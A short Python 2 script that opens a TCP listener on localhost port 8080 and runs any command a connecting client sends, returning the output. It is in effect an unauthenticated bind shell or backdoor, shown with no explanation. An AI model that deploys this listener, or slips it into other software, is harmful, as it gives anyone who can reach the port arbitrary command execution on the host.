import socket, select, os, subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('127.0.0.1', 8080))
s.listen(10)
input = [s]
while 1:
    reader, output, exceptions = select.select(input,[],[])
    for sock in reader:
        if sock == s:
            c,addr = s.accept()
            print "New connection from ", addr
            input.append(c)
        else:
            command = sock.recv(1024)
            if command:
                shell = command.rstrip().split(" ")
                try:
                    out = subprocess.Popen(shell, stdout=subprocess.PIPE).communicate()[0]
                    sock.send(out)
                    print "Command executed."
                except:
                    out = "Command failed\n"
                    sock.send(out)
                else:
                    sock.close()
                    input.remove(sock)
                
s.close()
